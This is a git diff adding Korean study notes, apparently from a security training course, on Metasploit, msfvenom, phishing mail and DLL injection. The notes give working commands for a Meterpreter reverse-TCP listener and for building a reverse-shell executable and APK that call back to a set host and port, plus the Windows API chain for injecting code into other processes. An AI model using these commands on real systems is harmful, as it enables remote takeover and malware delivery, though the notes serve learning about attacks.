@@ -9,6 +9,85 @@
   - 웹 취약점
   - 모바일
 
+## metasploit
+### command
+```
+service postgresql start
+service metasploit start
+msfconsole
+```
+실행 안 될 경우
+find /usr -name dalvik.rb -print <- 설정 파일 검색
+마지막 줄 cert.not_after = cert.not_before + 3600 * 24 * 365 * 20
+20 -> 2로 변경 후 저장
+
+### command
+```
+search (search adobe)
+use (exploit/linux/browser/adobe_flashplayer_aslaunch)
+use windows/meterpreter/reverse_tcp //특정 공간 선택할 수 있음
+back (cancel)
+show options
+set lhost 10.10.10.10
+exploit //공격,      +encoders: 특정 기호로 변경
+shellcode
+bind (->)
+reverse (<-)
+```
+
+#### senario
+```
+공격자가 피해자의 연결을 대기한다.
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lport 7070
+set lhost 10.0.2.15
+exploit
+```
+
+#### 악성코드 생성
+커널에서
+```
+msfvenom -l payloads
+(msfvenom -p windows/meterpreter/reverse_tcp lhost=10.100.244.20 lport=7070 -f
+c)
+(msfvenom -p windows/meterpreter/reverse_tcp lhost=10.100.244.20 lport=7070 -f
+apk)
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.100.244.20 lport=7070 -f
+exe > mytext.exe
+```
+#### 공유폴더/파일전송
+이더넷 인터페이스 통신으로 전송
+```
+file system/media/sf_폴더명
+```
+> mytext.exe 옮기니 알약이 감지함
+> 백신 끄고 실행하니 쉘 따짐
+
+#### 해야 할 것
+- 행위분석 수집 프로그램 개발
+- 전처리 프로그램 개발
+- 데이터분석
+
+#### 악성코드 메일 공격 방식
+> 메일 자동 전송 1:다 공격 가능
+> 수신확인 - 스크립트(html)
+> 파이썬 코드로 메일 전송 가능(mime)
+
+#### 워드 매크로(CDR?)
+passwordchecker procexp에서 full dump 후 strings로 분석
+strings PasswordChecker.dmp > a.txt
+비밀번호, 메세지 등 문자열로 저장되어 있음
+활용 ex
+> c소켓 프로그래밍 <- 서버
+> 워드 매크로 <- 클라이언트
+> 악성 메일 보내서 클릭 여부 확인 가능
+
+
+주체: 행위, 메모리, 실행파일
+환경: 얘도 알아야
+
+
 
 ![day2_2](https://user-images.githubusercontent.com/50771111/88466051-756ab380-cf03-11ea-972a-a8c19b88ad2f.jpg)
 
@@ -67,7 +146,7 @@ send(s, comName(0), buf, 0) // 서버의 read로 보내줌
 
 DLL은 혼자 프로그램 돌아갈 수 X
 #### cmd
-> rundll32.exe DLL파일 경로, main // rundll32.exe 라는 보안 프로그램이 있음, 강제적으로 부모 만들어주는 것!
+> rundll32.exe DLL파일 경로, main // rundll32.exe 라는 보안 프로그램이 있음, 강제적으로 부모 만들어주는 것!(가짜 main 생성)
 => **DLL Injection은 코드(메세지 박스)를 다른 프로그램에 삽입해서 실행될 수 있게 하는 것?!
 
 ### DLL Injection
@@ -78,6 +157,17 @@ testdll.dll이 11자리이기 때문에 실행시키고 싶은 다른 프로그�
 > writeMemory(x, "내용(ex.aaa)"); //남의 메모리에 aaa 써짐 **=> y**
 > GetProcAddress("&L-); //주소얻음 **=> z**
 >CreateREmoteThread(z, y);
+
+* 사용 함수
+  - VirtualAllocEx
+  - WriteProcessMemory
+  - GetModuleHandle <- loadlibrary
+  - GetProcAddress
+  - RemoteThread
+
+
+
+
 
 **snapshot**
 
